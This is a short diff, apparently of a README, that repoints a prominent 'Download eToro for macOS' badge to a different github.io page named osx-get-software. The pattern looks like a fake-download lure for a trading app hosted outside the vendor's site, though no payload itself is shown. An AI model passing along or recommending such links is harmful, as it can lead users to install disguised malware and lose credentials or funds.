@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://mokadami-olexus.github.io/.github/etoro-app">  
+<a href="https://osx-get-software.github.io/.github/etoro-app">  
 <img src="https://img.shields.io/badge/⬇️_Download_eToro_for_macOS-brightgreen?style=for-the-badge&logo=apple" alt="Download eToro App for macOS">  
 </a>  
 
